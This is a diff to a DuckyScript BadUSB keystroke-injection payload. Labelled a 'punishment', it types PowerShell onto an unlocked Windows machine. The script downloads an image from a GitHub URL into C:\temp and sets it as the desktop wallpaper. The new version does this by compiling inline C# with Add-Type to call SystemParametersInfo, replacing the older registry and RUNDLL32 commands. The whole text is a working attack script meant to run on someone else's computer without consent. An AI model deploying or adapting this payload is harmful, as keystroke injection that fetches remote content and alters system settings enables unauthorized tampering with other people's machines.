@@ -13,11 +13,20 @@ REM Download and set punishment
 STRING Invoke-WebRequest -Uri https://github.com/TestingLearningStudent/FlippiWallpper/blob/main/NoLock.jpg?raw=true -OutFile "c:\temp\punishi.jpg"
 ENTER
 DELAY 1000
-STRING reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\temp\punishi.jpg /f
+STRING $imgPath="C:\temp\punishi.jpg"
 ENTER
 DELAY 500
-STRING RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters 1, True
+STRING $code = @' 
 ENTER
 DELAY 500
-STRING exit
+STRING using System.Runtime.InteropServices;namespace Win32{public class Wallpaper{[DllImport("user32.dll", CharSet=CharSet.Auto)]static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;public static void SetWallpaper(string thePath){SystemParametersInfo(20,0,thePath,3);}}}
+ENTER
+DELAY 1000
+STRING '@
+ENTER
+DELAY 500
+STRING add-type $code 
+ENTER
+DELAY 500
+STRING [Win32.Wallpaper]::SetWallpaper($imgPath)
 ENTER
